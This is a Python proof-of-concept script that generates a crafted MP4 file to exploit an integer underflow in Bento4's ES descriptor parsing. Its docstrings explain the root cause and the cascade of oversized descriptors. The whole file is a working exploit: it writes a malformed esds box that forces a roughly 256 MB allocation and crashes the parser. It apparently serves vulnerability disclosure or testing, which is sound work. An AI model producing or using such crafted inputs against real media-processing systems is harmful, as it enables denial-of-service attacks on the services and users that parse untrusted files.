#!/usr/bin/env python3
"""
PoC generator for Bento4 AP4_EsDescriptor integer underflow vulnerability.

Vulnerability: Ap4EsDescriptor.cpp line 103
    AP4_SubStream* substream = new AP4_SubStream(stream, offset,
                                                 payload_size-AP4_Size(offset-start));

Root cause: When payload_size=2 but the constructor reads ES_ID(2B)+flags(1B)=3 bytes,
(offset-start)=3 > payload_size=2, causing unsigned underflow:
    2 - 3 = 0xFFFFFFFF  (AP4_Size wraps around)
The resulting SubStream has a declared size of ~4GB, allowing reads far beyond the
declared descriptor boundary, which cascades into a huge allocation attempt.

Cascade:
  1. SubStream1 (size=0xFFFFFFFF) → parses DecoderConfigDescriptor (tag=0x04, size=0x0FFFFFFF)
  2. DecoderConfigDescriptor reads 13 bytes of fixed fields, creates SubStream2 (size~=0x0FFFFFEF)
  3. SubStream2 → parses DecoderSpecificInfoDescriptor (tag=0x05, size=0x0FFFFFFF)
  4. AP4_DataBuffer::SetDataSize(0x0FFFFFFF) → new AP4_Byte[0x0FFFFFFF] → ~256MB allocation
  5. OOM / ASAN mmap limit exceeded / bad_alloc
"""
import struct
import os

SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
OUTPUT_FILE = os.path.join(SCRIPT_DIR, "vuln_002.mp4")


def make_box(fourcc, payload):
    """Return a standard box: 4-byte BE size + 4-byte fourcc + payload."""
    if isinstance(fourcc, str):
        fourcc = fourcc.encode("latin-1")
    assert len(fourcc) == 4
    size = 8 + len(payload)
    return struct.pack(">I4s", size, fourcc) + payload


def make_full_box(fourcc, version, flags, payload):
    """Return a FullBox: make_box with version(1B) + flags(3B) prepended."""
    header = struct.pack(">B", version) + struct.pack(">I", flags)[1:]
    return make_box(fourcc, header + payload)


def build_ftyp():
    data = b"isom" + struct.pack(">I", 0) + b"isom" + b"mp41"
    return make_box("ftyp", data)


def build_mvhd():
    identity_matrix = struct.pack(
        ">9I",
        0x00010000, 0, 0,
        0, 0x00010000, 0,
        0, 0, 0x40000000,
    )
    data = (
        struct.pack(">I", 0) +         # version=0, flags=0
        struct.pack(">I", 0) +         # creation_time
        struct.pack(">I", 0) +         # modification_time
        struct.pack(">I", 1000) +      # timescale
        struct.pack(">I", 1000) +      # duration
        struct.pack(">I", 0x00010000) +# rate = 1.0
        struct.pack(">H", 0x0100) +    # volume = 1.0
        b"\x00" * 10 +                 # reserved
        identity_matrix +              # 36 bytes
        b"\x00" * 24 +                 # pre_defined
        struct.pack(">I", 2)           # next_track_id
    )
    return make_box("mvhd", data)


def build_tkhd():
    identity_matrix = struct.pack(
        ">9I",
        0x00010000, 0, 0,
        0, 0x00010000, 0,
        0, 0, 0x40000000,
    )
    data = (
        struct.pack(">I", 3) +         # version=0, flags=3 (enabled + in-movie)
        struct.pack(">I", 0) +         # creation_time
        struct.pack(">I", 0) +         # modification_time
        struct.pack(">I", 1) +         # track_id
        struct.pack(">I", 0) +         # reserved
        struct.pack(">I", 1000) +      # duration
        b"\x00" * 8 +                  # reserved
        struct.pack(">H", 0) +         # layer
        struct.pack(">H", 0) +         # alternate_group
        struct.pack(">H", 0) +         # volume
        struct.pack(">H", 0) +         # reserved
        identity_matrix +              # 36 bytes
        struct.pack(">II", 0, 0)       # width, height
    )
    return make_box("tkhd", data)


def build_mdhd():
    data = (
        struct.pack(">I", 0) +         # version=0, flags=0
        struct.pack(">I", 0) +         # creation_time
        struct.pack(">I", 0) +         # modification_time
        struct.pack(">I", 1000) +      # timescale
        struct.pack(">I", 1000) +      # duration
        struct.pack(">H", 0x55C4) +    # language ('und')
        struct.pack(">H", 0)           # pre_defined
    )
    return make_box("mdhd", data)


def build_hdlr():
    data = (
        struct.pack(">I", 0) +         # version=0, flags=0
        struct.pack(">I", 0) +         # pre_defined
        b"soun" +                       # handler_type
        b"\x00" * 12 +                 # reserved
        b"\x00"                         # name (empty null-terminated)
    )
    return make_box("hdlr", data)


def build_smhd():
    data = (
        struct.pack(">I", 0) +         # version=0, flags=0
        struct.pack(">H", 0) +         # balance
        struct.pack(">H", 0)           # reserved
    )
    return make_box("smhd", data)


def build_dinf():
    # url  (self-contained flag = 0x000001)
    url_data = struct.pack(">I", 1)    # version=0, flags=1
    url_box = make_box("url ", url_data)

    dref_data = (
        struct.pack(">I", 0) +         # version=0, flags=0
        struct.pack(">I", 1) +         # entry_count=1
        url_box
    )
    dref_box = make_box("dref", dref_data)
    return make_box("dinf", dref_box)


def build_crafted_esds():
    """
    Craft the esds box to trigger AP4_EsDescriptor integer underflow at line 103.

    ES_Descriptor:
      tag=0x03, payload_size=2 (only 2 bytes declared)
      Constructor reads ES_ID(2B) + flags(1B) = 3 bytes
      Underflow: payload_size(2) - consumed(3) = 0xFFFFFFFF
      SubStream1 created with size~4GB

    SubStream1 content (placed here in the esds box):
      [0-4]   tag=0x04 + expandable_size(0x0FFFFFFF) → DecoderConfigDescriptor
      [5-17]  DecoderConfig fixed fields (13 bytes)
              Offset 5: ObjectTypeIndication=0x40 (Audio ISO 14496-3)
              Offset 6: bits=0x15 (streamType=5=AudioStream)
              Offset 7-9: BufferSize=0
              Offset 10-13: MaxBitrate=0
              Offset 14-17: AvgBitrate=0
      [18-22] tag=0x05 + expandable_size(0x0FFFFFFF) → DecoderSpecificInfo
              This becomes SubStream2[0-4], triggering:
              m_Info.SetDataSize(0x0FFFFFFF) → new AP4_Byte[0x0FFFFFFF] (~256MB alloc)

    Expandable size encoding of 0x0FFFFFFF:
      7-bit groups: 0x7F 0x7F 0x7F 0x7F
      With continuation bits: 0xFF 0xFF 0xFF 0x7F
    """
    HUGE_SIZE = b"\xFF\xFF\xFF\x7F"   # expandable size = 0x0FFFFFFF

    data = b""
    data += struct.pack(">I", 0)       # version=0, flags=0

    # ES_Descriptor header: tag + payload_size (CRAFTED: 2 bytes declared)
    data += b"\x03"                    # tag = ES_DescrTag
    data += b"\x02"                    # payload_size = 2 (too small → underflow!)
    # Payload (2 bytes declared = ES_ID only):
    data += b"\x00\x01"               # ES_ID = 1

    # Flags byte - read by ReadUI08 OUTSIDE declared payload, at start+2:
    data += b"\x00"                    # streamPriorityFlags (no URL, no dependency)

    # ── SubStream1 starts here (offset = start+3) ──────────────────────────
    # SubStream1[0]: DecoderConfigDescriptor tag
    data += b"\x04"
    # SubStream1[1-4]: expandable size = 0x0FFFFFFF
    data += HUGE_SIZE

    # SubStream1[5-17]: DecoderConfig fixed fields (13 bytes)
    data += b"\x40"                    # ObjectTypeIndication = Audio ISO/IEC 14496-3
    data += b"\x15"                    # streamType=5 (AudioStream), upStream=0
    data += b"\x00\x00\x00"           # BufferSize = 0
    data += b"\x00\x00\x00\x00"       # MaxBitrate = 0
    data += b"\x00\x00\x00\x00"       # AvgBitrate = 0

    # SubStream1[18-22] = SubStream2[0-4]: DecoderSpecificInfo with huge size
    # This triggers: m_Info.SetDataSize(0x0FFFFFFF) → new AP4_Byte[~256MB]
    data += b"\x05"                    # tag = DecoderSpecificInfo
    data += HUGE_SIZE                  # expandable size = 0x0FFFFFFF

    return make_box("esds", data)


def build_stsd(esds_box):
    """Build stsd containing one mp4a sample entry with the crafted esds."""
    mp4a_content = (
        b"\x00" * 6 +                  # reserved
        struct.pack(">H", 1) +         # data_reference_index
        b"\x00" * 8 +                  # reserved
        struct.pack(">H", 2) +         # channelcount
        struct.pack(">H", 16) +        # samplesize
        struct.pack(">H", 0) +         # pre_defined
        struct.pack(">H", 0) +         # reserved
        struct.pack(">I", 44100 << 16) +  # samplerate (44100 Hz fixed-point 16.16)
        esds_box
    )
    mp4a_box = make_box("mp4a", mp4a_content)

    stsd_data = (
        struct.pack(">I", 0) +         # version=0, flags=0
        struct.pack(">I", 1) +         # entry_count
        mp4a_box
    )
    return make_box("stsd", stsd_data)


def build_stts():
    data = (
        struct.pack(">I", 0) +         # version=0, flags=0
        struct.pack(">I", 1) +         # entry_count
        struct.pack(">I", 1) +         # sample_count
        struct.pack(">I", 1000)        # sample_delta
    )
    return make_box("stts", data)


def build_stsc():
    data = (
        struct.pack(">I", 0) +         # version=0, flags=0
        struct.pack(">I", 1) +         # entry_count
        struct.pack(">I", 1) +         # first_chunk
        struct.pack(">I", 1) +         # samples_per_chunk
        struct.pack(">I", 1)           # sample_description_index
    )
    return make_box("stsc", data)


def build_stsz():
    data = (
        struct.pack(">I", 0) +         # version=0, flags=0
        struct.pack(">I", 0) +         # sample_size (0 = variable)
        struct.pack(">I", 1) +         # sample_count
        struct.pack(">I", 4)           # entry_size[0]
    )
    return make_box("stsz", data)


def build_stco(chunk_offset):
    data = (
        struct.pack(">I", 0) +         # version=0, flags=0
        struct.pack(">I", 1) +         # entry_count
        struct.pack(">I", chunk_offset)
    )
    return make_box("stco", data)


def build_moov(chunk_offset):
    esds_box  = build_crafted_esds()
    stsd_box  = build_stsd(esds_box)
    stts_box  = build_stts()
    stsc_box  = build_stsc()
    stsz_box  = build_stsz()
    stco_box  = build_stco(chunk_offset)

    stbl = make_box("stbl", stsd_box + stts_box + stsc_box + stsz_box + stco_box)

    smhd = build_smhd()
    dinf = build_dinf()
    minf = make_box("minf", smhd + dinf + stbl)

    mdhd = build_mdhd()
    hdlr = build_hdlr()
    mdia = make_box("mdia", mdhd + hdlr + minf)

    tkhd = build_tkhd()
    trak = make_box("trak", tkhd + mdia)

    mvhd = build_mvhd()
    return make_box("moov", mvhd + trak)


def compute_chunk_offset():
    """Build moov with a dummy offset to calculate its size, then derive the real offset."""
    ftyp = build_ftyp()
    moov = build_moov(0)       # placeholder offset; size is what matters
    return len(ftyp) + len(moov) + 8   # +8 for the mdat box header


def main():
    chunk_offset = compute_chunk_offset()
    print(f"[*] Computed chunk_offset = {chunk_offset} (0x{chunk_offset:08X})")

    ftyp_box = build_ftyp()
    moov_box = build_moov(chunk_offset)
    mdat_box = make_box("mdat", b"\x00\x00\x00\x00")   # 4 bytes dummy audio data

    mp4_bytes = ftyp_box + moov_box + mdat_box

    with open(OUTPUT_FILE, "wb") as f:
        f.write(mp4_bytes)

    print(f"[*] Total file size: {len(mp4_bytes)} bytes")
    print(f"[*] Written to: {OUTPUT_FILE}")
    print()
    print("[!] Vulnerability: AP4_EsDescriptor integer underflow")
    print("[!] File: Bento4/Source/C++/Core/Ap4EsDescriptor.cpp, line 103")
    print("[!] ES_Descriptor: tag=0x03, payload_size=2")
    print("[!]   Constructor reads ES_ID(2B)+flags(1B)=3 bytes → offset-start=3")
    print("[!]   Underflow: payload_size(2) - 3 = 0xFFFFFFFF (AP4_Size wrap)")
    print("[!]   SubStream1 created with size=0xFFFFFFFF (~4 GB)")
    print("[!] SubStream1 contains crafted DecoderConfigDescriptor (size=0x0FFFFFFF)")
    print("[!] SubStream2 contains crafted DecoderSpecificInfo (size=0x0FFFFFFF)")
    print("[!] Expected: ~256 MB allocation attempt → OOM/bad_alloc/ASAN mmap limit")


if __name__ == "__main__":
    main()
